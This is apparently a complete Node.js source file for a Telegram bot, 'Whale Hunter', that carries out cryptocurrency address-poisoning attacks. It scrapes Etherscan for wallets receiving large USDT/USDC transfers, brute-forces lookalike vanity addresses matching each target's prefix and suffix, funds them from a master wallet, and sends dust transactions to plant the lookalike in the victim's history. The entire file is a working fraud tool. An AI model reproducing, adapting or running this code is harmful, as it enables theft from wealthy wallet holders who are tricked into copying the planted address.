const { ethers } = require("ethers");
const { Telegraf, Markup } = require('telegraf');
const mongoose = require('mongoose');
const axios = require('axios');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
require('dotenv').config();

// --- 1. Database Setup ---
mongoose.connect(process.env.MONGO_URI);
const Target = mongoose.model('Target', {
    address: { type: String, unique: true },
    isDusted: { type: Boolean, default: false },
    asset: String,
    timestamp: { type: Date, default: Date.now }
});

// --- 2. Vanity Worker Logic ---
if (!isMainThread) {
    const { prefix, suffix } = workerData;
    (async () => {
        while (true) {
            const wallet = ethers.Wallet.createRandom();
            const addr = wallet.address.toLowerCase();
            if (addr.startsWith("0x" + prefix) && addr.endsWith(suffix)) {
                parentPort.postMessage({ address: wallet.address, privateKey: wallet.privateKey });
                break;
            }
        }
    })();
    return;
}

// --- 3. Bot & Provider Setup ---
const bot = new Telegraf(process.env.BOT_TOKEN);
const provider = new ethers.JsonRpcProvider(process.env.RPC_HTTP);
const masterWallet = new ethers.Wallet(process.env.MASTER_PRIVATE_KEY, provider);

const TOKENS = {
    USDT: { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", dec: 6 },
    USDC: { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", dec: 6 }
};

// --- 4. Free Whale Fetcher (Recent Transfers) ---
async function fetchRecentWhales() {
    const apiKey = process.env.ETHERSCAN_KEY;
    const whales = [];

    // Fetch USDT & USDC Transfers (Free Tier allows 5 calls/sec)
    for (const [symbol, info] of Object.entries(TOKENS)) {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&contractaddress=${info.addr}&page=1&offset=20&sort=desc&apikey=${apiKey}`;
        const res = await axios.get(url);
        
        if (res.data.result && Array.isArray(res.data.result)) {
            for (const tx of res.data.result) {
                const amount = parseFloat(ethers.formatUnits(tx.value, info.dec));
                if (amount > 50000) { // Threshold: $50k
                    // Check History
                    const exists = await Target.findOne({ address: tx.to });
                    if (!exists || !exists.isDusted) {
                        whales.push({ addr: tx.to, bal: amount, asset: symbol });
                    }
                }
            }
        }
    }
    // Return unique results, richest first
    return whales.sort((a, b) => b.bal - a.bal).slice(0, 5);
}

// --- 5. Bot Commands ---
bot.start(async (ctx) => {
    const bal = await provider.getBalance(masterWallet.address);
    const eth = ethers.formatEther(bal);
    
    ctx.reply(`🐋 **Whale Hunter (Free Tier)**\nMaster: \`${masterWallet.address}\`\nBalance: ${eth} ETH\n\n${eth < 0.01 ? "⚠️ FUND MASTER WALLET" : "✅ READY"}`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('🔍 Scan New Whales', 'scan')],
            [Markup.button.callback('📜 View Dusted History', 'history')]
        ])
    );
});

bot.action('scan', async (ctx) => {
    ctx.editMessageText("🔎 Searching for high-value transfers...");
    const list = await fetchRecentWhales();
    
    if (list.length === 0) return ctx.reply("❌ No new whales found. Try again in 5 mins.");

    let msg = "💎 **TOP UNDUSTED WHALES**\n\n";
    list.forEach((w, i) => {
        msg += `${i+1}. **${w.bal.toLocaleString()} ${w.asset}**\nAddr: \`${w.addr}\`\nAction: /dust_${w.addr}\n\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.action('history', async (ctx) => {
    const items = await Target.find({ isDusted: true }).limit(5).sort({ timestamp: -1 });
    let msg = "📜 **LAST 5 DUSTED**\n\n";
    items.forEach(i => msg += `✅ \`${i.address}\`\n`);
    ctx.reply(msg || "History is empty.");
});

bot.hears(/^\/dust_(0x[a-fA-F0-9]{40})$/, async (ctx) => {
    const target = ctx.match[1];
    const prefix = target.substring(2, 6);
    const suffix = target.slice(-3);

    ctx.reply(`🛰️ **Sequence Initiated**\n1. Brute-forcing vanity...\n2. Funding...\n3. Dusting...`);

    const worker = new Worker(__filename, { workerData: { prefix, suffix } });
    worker.on('message', async (vanity) => {
        try {
            // Fund Vanity
            const fund = await masterWallet.sendTransaction({ to: vanity.address, value: ethers.parseEther("0.004") });
            await fund.wait();

            // Send Dust
            const vanitySigner = new ethers.Wallet(vanity.privateKey, provider);
            const dust = await vanitySigner.sendTransaction({ to: target, value: ethers.parseEther("0.0001") });
            
            // Update History
            await Target.findOneAndUpdate({ address: target }, { isDusted: true, vanityAddress: vanity.address }, { upsert: true });

            ctx.reply(`✨ **Success!**\nTarget: \`${target}\`\nVanity: \`${vanity.address}\`\n[View Tx](https://etherscan.io/tx/${dust.hash})`, { parse_mode: 'Markdown' });
        } catch (e) { ctx.reply(`❌ Error: ${e.message}`); }
    });
});

bot.launch();